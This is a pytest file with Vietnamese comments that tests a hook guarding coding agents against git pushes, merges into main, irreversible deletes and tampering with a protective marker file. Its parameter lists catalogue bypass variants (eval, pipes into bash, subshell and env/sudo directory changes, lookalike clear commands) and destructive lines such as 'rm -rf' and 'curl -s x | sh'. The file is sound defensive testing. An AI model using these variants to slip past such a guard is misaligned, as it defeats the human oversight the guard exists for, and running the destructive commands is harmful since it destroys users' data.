    assert_allowed(repo, "find . -name '*.py'")
    assert_allowed(repo, "find . -name x -exec grep foo {} +")


def test_guard_marker_name_case_insensitive(tmp_path):
    """S-RF7: tên file dấu so không phân biệt hoa thường trên mọi hệ."""
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    assert_blocked(repo, "rm -rf .tmp/Autopilot.JSON", "irreversible_delete")
    assert_blocked(repo, "rm -rf .tmp/AUTOPILOT*", "irreversible_delete")
    assert_blocked(repo, "rm -rf .tmp/autopilot.js?n", "irreversible_delete")


def test_guard_tmp_glob_expands_and_checks_each_match(tmp_path):
    """S-RF3 / T-RF7: đích glob mở rộng theo thư mục lệnh; mỗi mục khớp phải nằm thật trong .tmp/."""
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    outside = tmp_path / "outside"
    outside.mkdir()
    (repo / ".tmp" / "keep1").mkdir()
    (repo / ".tmp" / "keep2").mkdir()
    assert_allowed(repo, "rm -rf .tmp/keep*")
    assert_allowed(repo, "rm -rf .tmp/nomatch*")  # không khớp gì: không xoá gì
    link_dir(outside, repo / ".tmp" / "lnk")
    assert_blocked(repo, "rm -rf .tmp/ln*", "irreversible_delete")
    assert_blocked(repo, "rm -rf .tmp/l*", "irreversible_delete")
    assert_blocked(repo, "rm -rf .tmp/ln*/", "irreversible_delete")
    assert_blocked(repo, "rm -rf .tmp/lnk/", "irreversible_delete")
    assert_blocked(repo, "Remove-Item -Recurse -Force .tmp\\ln*", "irreversible_delete")
    assert_blocked(repo, "rm -rf .tmp/[kl]*", "irreversible_delete")  # khớp keep* lẫn lnk
    assert_allowed(repo, "rm -rf .tmp/keep[12]")


def test_guard_tmp_glob_unreadable_parent_blocks(tmp_path, monkeypatch):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    real = os.listdir

    def failing(path="."):
        if str(path).endswith(".tmp"):
            raise OSError("denied")
        return real(path)

    monkeypatch.setattr(os, "listdir", failing)
    assert_blocked(repo, "rm -rf .tmp/keep*", "irreversible_delete")


# ===================== vòng sửa 2 (S-N-RF1, S-N-RF2, T-N-RF1, S-RF6 phần còn) =====================

@pytest.mark.parametrize("cmd", [
    "(cd {feat} && true); git merge x", "bash -c 'cd {feat}'; git merge x", "cd {feat} | true; git merge x",
    "(cd {feat}); git pull", "cd {feat} & git merge x", "(cd {main}); cd {feat}; git merge x",
])
def test_guard_cd_in_subshell_does_not_hide_main(tmp_path, cmd):
    """S-N-RF1: cd trong subshell/pipeline/bash -c không đổi thư mục của lệnh sau; thư mục ban đầu là main thì vẫn chặn."""
    mainrepo = make_repo(tmp_path / "m", branch="main", marker=good_marker(WITHOUT_BRANCH))
    feat = make_repo(tmp_path / "f", branch="spr-13")
    assert_blocked(mainrepo, cmd.format(feat=fwd(feat), main=fwd(mainrepo)), "main_merge")


def test_guard_cd_visited_dirs_all_count(tmp_path):
    sprint = make_repo(tmp_path / "s", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
    mainrepo = make_repo(tmp_path / "m", branch="main")
    feat = make_repo(tmp_path / "f", branch="spr-13")
    # đã từng vào thư mục main (kể cả trong subshell) rồi mới sang nhánh khác: đóng an toàn
    assert_blocked(sprint, "cd {m}; (cd {f}); git merge x".format(m=fwd(mainrepo), f=fwd(feat)), "main_merge")
    # quy tắc vòng 3: có đổi thư mục thì coi là main, kể cả khi chỉ đi qua thư mục không phải main
    assert_blocked(sprint, "cd {f} && git merge x".format(f=fwd(feat)), "main_merge")
    # git -C vẫn đọc nhánh của chính thư mục đó, bất kể cd trước
    main_marked = make_repo(tmp_path / "mm", branch="main", marker=good_marker(WITHOUT_BRANCH))
    assert_allowed(main_marked, "git -C {f} merge x".format(f=fwd(feat)))
    assert_blocked(sprint, "git -C {m} merge x".format(m=fwd(mainrepo)), "main_merge")


@pytest.mark.parametrize("cmd", [
    "Push-Location {main}; git merge x", "push-location {main} && git pull", "Pop-Location; git merge x", "popd; git merge x",
    "env -C {main} git merge spr-12", "env --chdir={main} git merge spr-12", "env --chdir {main} git pull",
    "sudo -D {main} git merge x", "sudo --chdir={main} git merge x", "env -i -C {main} git merge x",
])
def test_guard_other_directory_changers(tmp_path, cmd):
    """S-N-RF2 / T-N-RF1: Push/Pop-Location, env -C/--chdir, sudo -D/--chdir đổi thư mục như cd."""
    sprint = make_repo(tmp_path / "s", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
    mainrepo = make_repo(tmp_path / "m", branch="main")
    assert_blocked(sprint, cmd.format(main=fwd(mainrepo)), "main_merge")


def test_guard_directory_changers_to_non_main_still_blocked(tmp_path):
    sprint = make_repo(tmp_path / "s", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
    feat = make_repo(tmp_path / "f", branch="spr-13")
    for cmd in ("Push-Location {f}; git merge x", "env -C {f} git merge x", "sudo -D {f} git merge x", "env --chdir={f} git pull"):
        assert_blocked(sprint, cmd.format(f=fwd(feat)), "main_merge")


def test_guard_pull_is_a_merge_when_branch_merge_local_listed(tmp_path):
    """S-RF6 phần còn: `git pull` gộp cục bộ → khi thiếu `+nhánh` chặn ở mọi nhánh."""
    default = make_repo(tmp_path / "d", branch="spr-12", marker=good_marker())
    assert_blocked(default, "git pull", "branch_merge_local")
    assert_blocked(default, "git pull --ff-only", "branch_merge_local")
    assert_blocked(default, "git pull origin spr-12", "branch_merge_local")
    assert_blocked(default, "git -C . pull", "branch_merge_local")
    onmain = make_repo(tmp_path / "m", branch="main", marker=good_marker())
    assert_blocked(onmain, "git pull", "main_merge")
    plus = make_repo(tmp_path / "p", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
    assert_allowed(plus, "git pull")  # +nhánh: gộp cục bộ ngoài nhánh chính được phép
    assert_allowed(default, "git fetch")


# ===================== vòng sửa 3: mọi thao tác đổi thư mục trước merge/pull (không -C) = main =====================

@pytest.mark.parametrize("cmd", [
    "(cd sub); cd {rel}; git merge x",  # N2-RF1: cd tương đối tính từ cd trong subshell
    "cd sub && cd {rel} && git merge x",
    "env -C{rel} git merge x",  # N2-RF2: viết dính
    "sudo -D{rel} git merge x",
    "env --chdir{rel} git merge x", "env --ch={rel} git merge x", "sudo --chdir={rel} git pull",
    "cd sub; git merge x", "Set-Location sub; git merge x", "sl sub; git pull", "chdir sub && git merge x", "pushd sub; git merge x",
    "bash -c 'cd sub'; git merge x", "popd; git pull",
])
def test_guard_any_dir_change_before_merge_counts_as_main(tmp_path, cmd):
    sprint = make_repo(tmp_path / "s", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
    (sprint / "sub").mkdir()
    mainrepo = make_repo(tmp_path / "m", branch="main")
    assert_blocked(sprint, cmd.format(rel=fwd(os.path.relpath(mainrepo, sprint))), "main_merge")


def test_guard_merge_without_dir_change_and_git_c_unchanged(tmp_path):
    sprint = make_repo(tmp_path / "s", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
    feat = make_repo(tmp_path / "f", branch="spr-13")
    for cmd in ("git merge spr-12-tk3", "git pull", "git add -A && git commit -m x && git merge spr-12-tk3",
                "git -C {f} merge x", "cd {f} && git -C {f} merge x", "git merge x && cd sub"):
        assert_allowed(sprint, cmd.format(f=fwd(feat)))
    assert_blocked(sprint, "git -C $UNKNOWN merge x", "main_merge")
    assert_blocked(sprint, "cd sub && git -C rel merge x", "main_merge")  # -C tương đối sau cd: gốc không biết


# ===================== TK8 vòng 1: bảo vệ file dấu, công cụ ghi file, cụm cờ, nối dòng, eval/ống, -C, launcher, hooks.json =====================

MARKER_REASON = "file dấu là rào — chỉ người dùng hoặc lệnh dừng mới xoá"


def assert_marker_blocked(repo, cmd):
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2 and MARKER_REASON in err, (cmd, rc, err)


@pytest.mark.parametrize("cmd", [
    "rm .tmp/autopilot.json", "rm -f .tmp/autopilot.json", "rm -f .tmp/*", "rm .tmp/auto*", "rm .tmp/AUTOPILOT.JSON",
    "rm -f ./.tmp/autopilot.json", "rm -f .tmp\\autopilot.json", "mv .tmp/autopilot.json .tmp/x", "mv x .tmp/autopilot.json",
    "mv .tmp x", "cp x .tmp/autopilot.json", "cp /dev/null .tmp/autopilot.json", "Remove-Item .tmp\\autopilot.json",
    "Remove-Item .tmp/*", "Move-Item .tmp/autopilot.json x", "Rename-Item .tmp/autopilot.json y", "Set-Content .tmp/autopilot.json '{}'",
    "Out-File -FilePath .tmp/autopilot.json", "echo '{}' > .tmp/autopilot.json", "echo x >> .tmp/autopilot.json",
    "echo x >.tmp/autopilot.json", "echo x 2>.tmp/autopilot.json", "> .tmp/autopilot.json", ": > .tmp/autopilot.json",
    "echo x | tee .tmp/autopilot.json", "truncate -s 0 .tmp/autopilot.json", "sed -i s/a/b/ .tmp/autopilot.json",
    "sed -i.bak s/a/b/ .tmp/autopilot.json", "python -c pass .tmp/autopilot.json", "git rm .tmp/autopilot.json", "git checkout -- .tmp",
    "unlink .tmp/autopilot.json", "cd .tmp && rm autopilot.json", "cd .tmp; rm *", "Set-Location .tmp; Remove-Item autopilot.json",
])
def test_guard_marker_is_protected_from_shell_writes(tmp_path, cmd):
    """RF2 (TK8 tr-a) / RF3 (tr-b): file dấu không bị xoá, đổi tên, ghi đè bằng lệnh shell không chỉ-đọc."""
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    assert_marker_blocked(repo, cmd)


def test_guard_marker_protection_read_only_and_other_files_allowed(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    for cmd in ("cat .tmp/autopilot.json", "type .tmp\\autopilot.json", "Get-Content .tmp/autopilot.json", "ls .tmp", "ls .tmp/*",
                "ls -la .tmp/autopilot.json", "test -f .tmp/autopilot.json", "[ -f .tmp/autopilot.json ]", "grep level .tmp/autopilot.json",
                "git status .tmp", "git diff .tmp/autopilot.json", "sed -n 1p .tmp/autopilot.json", "head -n 1 .tmp/autopilot.json",
                "echo hi", "rm -f .tmp/other.txt", "rm .tmp/scratch.txt", "cp a b", "mv a b", "echo x > .tmp/out.txt", "echo x > out.txt",
                "echo x > src/autopilot.json.bak", "python -c pass .tmp/notes.json"):
        assert_allowed(repo, cmd)


def test_guard_marker_protection_resolves_from_command_dir_and_other_markers_allowed(tmp_path):
    repo = make_repo(tmp_path / "a", branch="spr-12", marker=good_marker())
    (repo / "src").mkdir()
    assert_marker_blocked(repo / "src", "rm -f ../.tmp/autopilot.json")
    assert_marker_blocked(repo / "src", "rm -f " + fwd(repo / ".tmp" / "autopilot.json"))
    assert_allowed(repo / "src", "rm -f .tmp/autopilot.json")  # `.tmp` của thư mục con, không phải file dấu đang bật
    # điều phối chép file dấu sang worktree khác bằng đường tuyệt đối, không cd: không đụng file dấu đang bật... (nguồn là file dấu đang bật nên vẫn là đọc-ghi)
    other = tmp_path / "wt"
    (other / ".tmp").mkdir(parents=True)
    assert_allowed(repo, "echo '{}' > " + fwd(other / ".tmp" / "autopilot.json"))
    assert_allowed(repo, "cp x " + fwd(other / ".tmp" / "autopilot.json"))


def test_guard_marker_protection_symlink_alias(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    try:
        os.symlink(repo / ".tmp" / "autopilot.json", repo / ".tmp" / "alias")
    except (OSError, NotImplementedError):
        pytest.skip("không tạo được symlink file trên máy này (cần đặc quyền)")
    assert_marker_blocked(repo, "rm .tmp/alias")


@pytest.mark.parametrize("payload_of", ["claude_write", "claude_edit", "claude_multiedit", "claude_notebook", "codex_patch",
                                        "codex_patch_move", "antigravity_write", "antigravity_replace", "antigravity_multi"])
def test_guard_marker_blocks_write_tools(tmp_path, payload_of):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    target = str(repo / ".tmp" / "autopilot.json")
    payloads = {
        "claude_write": ("claude", {"tool_name": "Write", "tool_input": {"file_path": target, "content": "{}"}, "cwd": str(repo)}),
        "claude_edit": ("claude", {"tool_name": "Edit", "tool_input": {"file_path": ".tmp/AUTOPILOT.json", "old_string": "a", "new_string": "b"},
                                   "cwd": str(repo)}),
        "claude_multiedit": ("claude", {"tool_name": "MultiEdit", "tool_input": {"file_path": target, "edits": []}, "cwd": str(repo)}),
        "claude_notebook": ("claude", {"tool_name": "NotebookEdit", "tool_input": {"notebook_path": target}, "cwd": str(repo)}),
        "codex_patch": ("codex", {"tool_name": "apply_patch", "cwd": str(repo),
                                  "tool_input": {"command": "*** Begin Patch\n*** Update File: .tmp/autopilot.json\n@@\n-a\n+b\n*** End Patch"}}),
        "codex_patch_move": ("codex", {"tool_name": "apply_patch", "cwd": str(repo),
                                       "tool_input": {"command": "*** Begin Patch\n*** Update File: x.md\n*** Move to: .tmp/autopilot.json\n*** End Patch"}}),
        "antigravity_write": ("antigravity", {"toolCall": {"name": "write_to_file", "args": {"TargetFile": target}}, "cwd": str(repo)}),
        "antigravity_replace": ("antigravity", {"toolCall": {"name": "replace_file_content", "args": {"TargetFile": target}}, "cwd": str(repo)}),
        "antigravity_multi": ("antigravity", {"toolCall": {"name": "multi_replace_file_content", "args": {"TargetFile": target, "Cwd": str(repo)}}}),
    }
    fmt, payload = payloads[payload_of]
    rc, out, err = run(fmt, payload)
    if fmt == "antigravity":
        decision = json.loads(out)
        assert rc == 0 and decision["decision"] == "deny" and MARKER_REASON in decision["reason"]
    else:
        assert rc == 2 and MARKER_REASON in err


def test_guard_write_tools_other_files_and_no_marker_allowed(tmp_path):
    repo = make_repo(tmp_path / "a", branch="spr-12", marker=good_marker())
    assert run("claude", {"tool_name": "Write", "tool_input": {"file_path": str(repo / "src.md")}, "cwd": str(repo)}) == (0, "", "")
    assert run("claude", {"tool_name": "Write", "tool_input": {"file_path": str(repo / ".tmp" / "notes.md")}, "cwd": str(repo)}) == (0, "", "")
    other = make_repo(tmp_path / "b", branch="spr-12")  # không file dấu: intake ghi file dấu lần đầu phải qua
    assert run("claude", {"tool_name": "Write", "tool_input": {"file_path": str(other / ".tmp" / "autopilot.json")}, "cwd": str(other)}) == (0, "", "")
    # worktree khác (không phải file dấu đang bật): điều phối chép file dấu bằng công cụ ghi được qua
    wt = tmp_path / "wt"
    (wt / ".tmp").mkdir(parents=True)
    assert run("claude", {"tool_name": "Write", "tool_input": {"file_path": str(wt / ".tmp" / "autopilot.json")}, "cwd": str(repo)}) == (0, "", "")


@pytest.mark.parametrize("cmd", ["sudo -Hu deploy git push", "sudo -Eu root git push", "env -iu HOME git push", "xargs -tI {} git push",
                                 "sudo -EHu x -g y git push", "env -iC /tmp git push"])
def test_guard_short_flag_clusters_ending_in_value_flag(tmp_path, cmd):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    assert_blocked(repo, cmd, "push")
    assert_allowed(repo, cmd.replace("git push", "git status"))


def test_guard_line_continuation_joined(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    assert_blocked(repo, "git \\\npush origin x", "push")
    assert_blocked(repo, "git \\\r\n  push", "push")
    assert_blocked(repo, "git `\npush", "push")
    assert_blocked(repo, "git push \\\n --force", "push")
    assert_allowed(repo, "git \\\nstatus")
    assert_blocked(repo, "git status\ngit push", "push")


@pytest.mark.parametrize("cmd,item", [
    ('eval "git push"', "push"), ("eval git push", "push"), ("eval 'git add . && git push'", "push"), ("eval rm -rf build", "irreversible_delete"),
    ('iex "git push"', "push"), ("Invoke-Expression 'git push'", "push"),
    ("echo git push | bash", "push"), ('echo "git push" | sh', "push"), ("printf 'git push' | pwsh", "push"),
    ("echo git push | sudo bash", "push"), ("echo git push | bash -s", "push"), ("echo git push | iex", "push"),
    ('bash <<< "git push"', "push"), ("echo rm -rf build | bash", "irreversible_delete"),
    ("eval git $ARGS", "unresolved"), ("echo git $ARGS | bash", "unresolved"), ("eval \"gh pr merge $N\"", "main_merge"),
])
def test_guard_eval_and_pipe_into_shell(tmp_path, cmd, item):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2, (cmd, err)
    if item == "unresolved":
        assert "không phân tích được" in err
    else:
        assert "'{}'".format(item) in err


def test_guard_eval_and_pipe_benign_allowed(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    for cmd in ("eval echo hi", "eval $(ssh-agent)", "echo hi | bash", "cat script.sh | bash", "curl -s x | sh", "echo git status | bash",
                "ls | grep git", "echo $X | bash", "bash -s < script.sh"):
        assert_allowed(repo, cmd)
    # lồng quá sâu qua eval: chặn
    deep = "eval \"eval 'eval \\\"eval git push\\\"'\""
    rc, _, _ = run("claude", claude(deep, repo))
    assert rc == 2


def test_guard_git_c_from_outside_repo_finds_marker(tmp_path):
    repo = make_repo(tmp_path / "r", branch="spr-12", marker=good_marker())
    outside = tmp_path / "outside"
    outside.mkdir()
    rel = fwd(os.path.relpath(repo, outside))
    for cmd in ("git -C {r} push", "git -C {rel} push", "git -C {rel} reset --hard", "cd {rel} && git push", "bash -c 'git -C {rel} push'",
                "git -c a=b -C {rel} push", "Set-Location {rel}; git push"):
        rc, _, err = run("claude", claude(cmd.format(r=fwd(repo), rel=rel), outside))
        assert rc == 2, (cmd, err)
    assert run("claude", claude("git -C {} status".format(rel), outside)) == (0, "", "")
    assert run("claude", claude("git -C {} push".format(fwd(outside)), outside)) == (0, "", "")  # đích không có file dấu


# --- launcher ---

SH = shutil.which("sh")
LAUNCHER = Path(os.environ.get("AUTOPILOT_LAUNCHER_PATH", str(SCRIPTS / "autopilot-hook.sh")))


def run_launcher(cwd, payload, path_dirs, extra_env=None):
    env = {"PATH": os.pathsep.join(str(d) for d in path_dirs), "CLAUDE_PROJECT_DIR": fwd(cwd), "PYTHONIOENCODING": "utf-8"}
    for key in ("SystemRoot", "SYSTEMROOT", "TEMP", "TMP", "HOME"):
        if key in os.environ:
            env[key] = os.environ[key]
    env.update(extra_env or {})
    import subprocess
    return subprocess.run([SH, fwd(LAUNCHER), "--format", "claude"], input=json.dumps(payload), capture_output=True, text=True,
                          encoding="utf-8", cwd=str(cwd), env=env)


@pytest.fixture
def bare_sh_ok(tmp_path):
    if SH is None:
        pytest.skip("không có `sh` trên máy này")
    empty = tmp_path / "emptybin"
    empty.mkdir()
    probe = run_launcher(tmp_path, {}, [empty])
    if probe.returncode != 0:
        pytest.skip("sh không chạy được với PATH rỗng trên máy này: " + probe.stderr[:80])
    return empty


def test_launcher_without_python_blocks_when_marker(tmp_path, bare_sh_ok):
    repo = make_repo(tmp_path / "r", branch="spr-12", marker=good_marker())
    sub = repo / "src"
    sub.mkdir()
    for cwd in (repo, sub):
        done = run_launcher(cwd, claude("git push", cwd), [bare_sh_ok])
        assert done.returncode == 2 and "không chạy được Python" in done.stderr, done.stderr
    # tên file dấu viết hoa
    (repo / ".tmp" / "autopilot.json").rename(repo / ".tmp" / "AutoPilot.JSON")
    assert run_launcher(repo, claude("ls", repo), [bare_sh_ok]).returncode == 2


def test_launcher_without_python_passes_when_no_marker(tmp_path, bare_sh_ok):
    repo = make_repo(tmp_path / "r", branch="spr-12")
    assert run_launcher(repo, claude("git push", repo), [bare_sh_ok]).returncode == 0
    nested = repo / "vendor"
    (nested / ".git").mkdir(parents=True)  # marker của repo ngoài không áp cho repo lồng
    (repo / ".tmp" / "autopilot.json").write_text("{}", encoding="utf-8")
    assert run_launcher(nested, claude("git push", nested), [bare_sh_ok], {"CLAUDE_PROJECT_DIR": fwd(nested)}).returncode == 0


def test_launcher_with_python_delegates_to_guard(tmp_path, bare_sh_ok):
    repo = make_repo(tmp_path / "r", branch="spr-12", marker=good_marker())
    path = [bare_sh_ok, Path(sys.executable).parent]
    blocked_run = run_launcher(repo, claude("git push", repo), path)
    if blocked_run.returncode == 2 and "không chạy được Python" in blocked_run.stderr:
        pytest.skip("launcher không thấy Python dùng được trong PATH thử")
    assert blocked_run.returncode == 2 and "'push'" in blocked_run.stderr
    assert run_launcher(repo, claude("git status", repo), path).returncode == 0
    plain = make_repo(tmp_path / "p", branch="spr-12")
    assert run_launcher(plain, claude("git push", plain), path).returncode == 0


def test_launcher_is_posix_sh_text():
    text = LAUNCHER.read_bytes().decode("utf-8")
    assert text.startswith("#!/bin/sh\n") and "\r" not in text
    assert "python3" in text and "py -3" in text and "exit 2" in text and "has_marker" in text


# --- hooks/hooks.json ---

def test_hooks_json_registers_guard():
    """Hook sống máy-rộng: đổi lệnh hay matcher ở `hooks/hooks.json` thì cập nhật test này cùng commit."""
    config = json.loads((REPO / "hooks" / "hooks.json").read_text(encoding="utf-8"))
    entries = config["hooks"]["PreToolUse"]
    assert [e["matcher"] for e in entries] == ["Bash|PowerShell", "Write|Edit|MultiEdit|NotebookEdit"]
    assert set(config["hooks"]) == {"PreToolUse"}
    for entry in entries:
        assert len(entry["hooks"]) == 1
        hook = entry["hooks"][0]
        assert hook["type"] == "command" and hook["timeout"] == 10 and hook["onFailure"] == "block"
        assert hook["command"] == 'sh "${CLAUDE_PLUGIN_ROOT}/scripts/autopilot-hook.sh" --format claude'
    assert (REPO / "scripts" / "autopilot-hook.sh").is_file() and (REPO / "scripts" / "autopilot_guard.py").is_file()


# ===================== lối dừng tường minh: --clear =====================

def clear_cli(directory):
    out, err = io.StringIO(), io.StringIO()
    rc = autopilot_guard.main(["--clear", str(directory)], stdin=io.StringIO(""), stdout=out, stderr=err)
    return rc, out.getvalue(), err.getvalue()


def test_clear_removes_only_the_marker_file(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    (repo / ".tmp" / "keep.txt").write_text("x", encoding="utf-8")
    (repo / "autopilot.json").write_text("{}", encoding="utf-8")  # cùng tên nhưng không ở .tmp/
    rc, out, err = clear_cli(repo)
    assert rc == 0 and err == "" and "đã xoá" in out and "autopilot.json" in out
    assert not (repo / ".tmp" / "autopilot.json").exists()
    assert (repo / ".tmp" / "keep.txt").exists() and (repo / "autopilot.json").exists() and (repo / ".git" / "HEAD").exists()
    # đã xoá rồi: báo và thoát 0
    rc, out, _ = clear_cli(repo)
    assert rc == 0 and "không có file dấu" in out
    # thư mục không có .tmp
    empty = tmp_path / "empty"
    empty.mkdir()
    rc, out, _ = clear_cli(empty)
    assert rc == 0 and "không có file dấu" in out
    # tên viết hoa
    (repo / ".tmp" / "AutoPilot.JSON").write_text("{}", encoding="utf-8")
    rc, out, _ = clear_cli(repo)
    assert rc == 0 and "đã xoá" in out and not (repo / ".tmp" / "AutoPilot.JSON").exists()


def test_clear_does_not_touch_a_directory_named_like_the_marker(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12")
    (repo / ".tmp" / "autopilot.json").mkdir()
    rc, out, _ = clear_cli(repo)
    assert rc == 0 and "không có file dấu" in out and (repo / ".tmp" / "autopilot.json").is_dir()


def test_clear_oserror_reported(tmp_path, monkeypatch):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())

    def refuse(path):
        raise PermissionError("denied")

    monkeypatch.setattr(os, "remove", refuse)
    rc, _, err = clear_cli(repo)
    assert rc == 1 and "không xoá được" in err


def test_clear_cli_subprocess_needs_no_format(tmp_path):
    import subprocess
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    done = subprocess.run([sys.executable, str(SCRIPTS / "autopilot_guard.py"), "--clear", str(repo)], capture_output=True, text=True,
                          encoding="utf-8", cwd=str(tmp_path))
    assert done.returncode == 0 and not (repo / ".tmp" / "autopilot.json").exists()
    missing = subprocess.run([sys.executable, str(SCRIPTS / "autopilot_guard.py")], capture_output=True, text=True, encoding="utf-8",
                             cwd=str(tmp_path), input="{}")
    assert missing.returncode == 2 and "--format" in missing.stderr  # argparse lỗi tham số


def test_guard_allows_clear_command_of_this_plugin(tmp_path):
    repo = make_repo(tmp_path / "a", branch="spr-12", marker=good_marker())
    other = make_repo(tmp_path / "b", branch="spr-12", marker=good_marker())
    guard = fwd(SCRIPTS / "autopilot_guard.py")
    launcher = fwd(SCRIPTS / "autopilot-hook.sh")
    for cmd in ("python {g} --clear {d}", "python3 {g} --clear {d}", "py -3 {g} --clear {d}", "python -I {g} --clear {d}",
                "python -X utf8 {g} --clear {d}", "sh {l} --clear {d}", "bash {l} --clear {d}", "python {g} --clear {d}/",
                "cd {d} && python {g} --clear {d}", "python {g} --clear ."):
        assert_allowed(repo, cmd.format(g=guard, l=launcher, d=fwd(other)))
    # chính file dấu của thư mục đang bật cũng dừng được bằng lối này
    assert_allowed(repo, "python {g} --clear {d}".format(g=guard, d=fwd(repo)))


@pytest.mark.parametrize("cmd", [
    "python other.py --clear {d}/.tmp/autopilot.json", "python other.py --clear {d}/.tmp", "python {g} other.py --clear {d}/.tmp",
    "python /elsewhere/autopilot_guard.py --clear {d}/.tmp/autopilot.json",
    "python {g} --clear {d} > {d}/.tmp/autopilot.json", "python {g} --clear {d}>{d}/.tmp/autopilot.json",
    "python {g} --format claude --clear {d}/.tmp/autopilot.json",
])
def test_guard_blocks_lookalike_clear_commands(tmp_path, cmd):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    rc, _, err = run("claude", claude(cmd.format(g=fwd(SCRIPTS / "autopilot_guard.py"), d=fwd(repo)), repo))
    assert rc == 2 and "file dấu là rào" in err, (cmd, err)


def test_clear_command_recognizer_is_exact():
    g, launcher = fwd(SCRIPTS / "autopilot_guard.py"), fwd(SCRIPTS / "autopilot-hook.sh")
    ok = autopilot_guard._is_clear_command
    assert ok(["python", g, "--clear", "d"]) and ok(["sh", launcher, "--clear", "d"]) and ok(["py", "-3", g, "--clear", "d"])
    for tokens in (["python", g, "--clear", "d", "--extra"], ["python", g, "--clear"], ["python", g, "--clear", "-x"],
                   ["ruby", g, "--clear", "d"], ["python", "-c", "pass", g, "--clear", "d"], ["python", "other.py", "--clear", "d"],
                   ["sh", g, "--clear", "d"], ["python", launcher, "--clear", "d"], ["python", g, "--clear", "d>x"], ["python", g, "--clear", ""],
                   ["python", g, "--format", "claude"], []):
        assert not ok(tokens), tokens


def test_guard_still_blocks_every_other_marker_removal(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    for cmd in ("rm {d}/.tmp/autopilot.json", "rm -rf {d}/.tmp", "Remove-Item {d}/.tmp/autopilot.json", "mv {d}/.tmp/autopilot.json {d}/x"):
        rc, _, err = run("claude", claude(cmd.format(d=fwd(repo)), repo))
        assert rc == 2, cmd


# ===================== TK8 vòng sửa 2: launcher dự phòng, find, đường tuyệt đối từ ngoài, cp nguồn, heredoc, stash =====================

@pytest.fixture
def outside(tmp_path):
    folder = tmp_path / "outside"
    folder.mkdir()
    return folder


def stage_launcher(folder, guard_text=None):
    """Chép launcher đang thử vào `folder` (như thư mục scripts của plugin), kèm guard giả nếu có; trả đường launcher đã chép."""
    folder.mkdir(parents=True, exist_ok=True)
    staged = folder / "autopilot-hook.sh"
    staged.write_bytes(LAUNCHER.read_bytes())
    if guard_text is not None:
        (folder / "autopilot_guard.py").write_text(guard_text, encoding="utf-8")
    return staged


def run_staged(staged, cwd, payload, path_dirs, stdin_text=None):
    import subprocess
    env = {"PATH": os.pathsep.join(str(d) for d in path_dirs), "CLAUDE_PROJECT_DIR": fwd(cwd)}
    for key in ("SystemRoot", "SYSTEMROOT", "TEMP", "TMP", "HOME"):
        if key in os.environ:
            env[key] = os.environ[key]
    data = stdin_text if stdin_text is not None else json.dumps(payload)
    return subprocess.run([SH, fwd(staged), "--format", "claude"], input=data, capture_output=True, text=True, encoding="utf-8", cwd=str(cwd), env=env)


def test_launcher_guard_missing_falls_back_to_marker_probe(tmp_path, bare_sh_ok):
    staged = stage_launcher(tmp_path / "scripts_no_guard")  # không có autopilot_guard.py cạnh launcher
    plain = make_repo(tmp_path / "p", branch="spr-12")
    marked = make_repo(tmp_path / "m", branch="spr-12", marker=good_marker())
    path = [bare_sh_ok, Path(sys.executable).parent]
    assert run_staged(staged, plain, claude("git push", plain), path).returncode == 0
    done = run_staged(staged, marked, claude("git push", marked), path)
    assert done.returncode == 2 and "autopilot:" in done.stderr


def test_launcher_guard_broken_falls_back_to_marker_probe(tmp_path, bare_sh_ok):
    plain = make_repo(tmp_path / "p", branch="spr-12")
    marked = make_repo(tmp_path / "m", branch="spr-12", marker=good_marker())
    path = [bare_sh_ok, Path(sys.executable).parent]
    if run_launcher(plain, claude("git status", plain), path).returncode != 0:
        pytest.skip("launcher không thấy Python dùng được trong PATH thử")
    for index, text in enumerate(("def (:\n", "raise RuntimeError('boom')\n", "import no_such_module_xyz\n")):
        staged = stage_launcher(tmp_path / "scripts_bad_{}".format(index), text)
        assert run_staged(staged, plain, claude("git push", plain), path).returncode == 0
        done = run_staged(staged, marked, claude("git push", marked), path)
        assert done.returncode == 2 and "guard lỗi" in done.stderr, text


def test_launcher_passes_guard_exit_codes_and_stdout(tmp_path, bare_sh_ok):
    repo = make_repo(tmp_path / "r", branch="spr-12", marker=good_marker())
    path = [bare_sh_ok, Path(sys.executable).parent]
    code_of = "import sys\nprint('seen', sys.stdin.read().strip())\nsys.exit({})\n"
    staged = stage_launcher(tmp_path / "scripts_fake", code_of.format(0))
    done = run_staged(staged, repo, None, path, stdin_text="EVENT")
    if "seen" not in done.stdout:
        pytest.skip("launcher không thấy Python dùng được trong PATH thử")
    assert done.returncode == 0 and "seen EVENT" in done.stdout  # sự kiện đi nguyên vẹn tới guard
    (tmp_path / "scripts_fake" / "autopilot_guard.py").write_text(code_of.format(2), encoding="utf-8")
    two = run_staged(staged, repo, None, path, stdin_text="E")
    assert two.returncode == 2 and "guard lỗi" not in two.stderr  # mã 2 của guard trả nguyên, không thay bằng lý do dự phòng


def test_launcher_has_no_guard_path_override(tmp_path, bare_sh_ok):
    """RF18: biến môi trường không đổi được guard mà launcher chạy."""
    assert "AUTOPILOT_GUARD_PATH" not in LAUNCHER.read_text(encoding="utf-8")
